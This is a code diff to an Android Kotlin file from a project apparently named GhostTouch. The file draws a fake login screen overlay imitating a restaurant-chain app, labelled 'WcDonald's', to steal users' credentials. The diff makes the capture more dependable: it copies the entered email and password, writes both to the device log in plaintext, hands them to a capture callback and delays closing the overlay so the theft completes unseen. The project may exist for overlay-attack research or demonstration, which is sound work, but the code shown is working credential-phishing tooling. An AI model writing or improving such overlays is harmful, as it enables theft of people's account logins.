@@ -1,5 +1,6 @@
 package com.ghosttouch.attacker.overlay
 
+import android.util.Log
 import androidx.compose.foundation.background
 import androidx.compose.foundation.layout.*
 import androidx.compose.foundation.shape.RoundedCornerShape
@@ -20,6 +21,8 @@ import androidx.compose.ui.text.input.PasswordVisualTransformation
 import androidx.compose.ui.text.input.VisualTransformation
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
+import kotlinx.coroutines.delay
+import kotlinx.coroutines.launch
 
 /**
  * Fake login overlay that mimics the WcDonald's login screen.
@@ -56,6 +59,7 @@ fun FakeLoginOverlay(
     var password by remember { mutableStateOf("") }
     var passwordVisible by remember { mutableStateOf(false) }
     var isLoading by remember { mutableStateOf(false) }
+    val coroutineScope = rememberCoroutineScope()
 
     // Fullscreen background matching WcDonald's theme
     Box(
@@ -170,10 +174,17 @@ fun FakeLoginOverlay(
                 Button(
                     onClick = {
                         isLoading = true
+                        // Read state values immediately before any lifecycle changes
+                        val capturedEmail = email
+                        val capturedPassword = password
+                        Log.d("FakeLoginOverlay", "Capturing: email=$capturedEmail, password=$capturedPassword")
                         // Capture the entered credentials
-                        onCredentialsCaptured(email, password)
-                        // Brief loading animation then dismiss
-                        onDismiss()
+                        onCredentialsCaptured(capturedEmail, capturedPassword)
+                        // Delay dismiss to let capture complete and show loading animation
+                        coroutineScope.launch {
+                            delay(500)
+                            onDismiss()
+                        }
                     },
                     modifier = Modifier
                         .fillMaxWidth()
